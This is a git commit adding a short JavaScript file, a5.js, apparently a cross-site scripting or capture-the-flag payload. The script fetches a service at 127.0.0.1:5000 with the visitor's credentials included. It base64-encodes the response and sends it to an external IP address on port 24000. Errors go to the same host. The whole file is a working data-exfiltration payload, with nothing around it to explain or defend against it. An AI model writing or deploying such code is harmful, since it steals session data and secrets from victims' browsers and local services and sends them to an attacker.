9da8f6f985463db03c8572881a2a00f970eca3d5
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 10:59:39 +0100

    Update and rename a4.js to a5.js

---
+++ a5.js
@@ -0,0 +1,19 @@
+const url = 'http://127.0.0.1:5000';
+
+fetch(url, {
+    method: "GET",
+    mode: "same-origin",
+    cache: "no-cache",
+    credentials: "include",
+    redirect: "follow"
+})
+  .then(response => {
+    return response.json();
+  })
+  .then(data => {
+    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
+  })
+  .catch(error => {
+    console.log("error");
+    fetch("http://82.65.210.151:24000/?error=" + error);
+  });
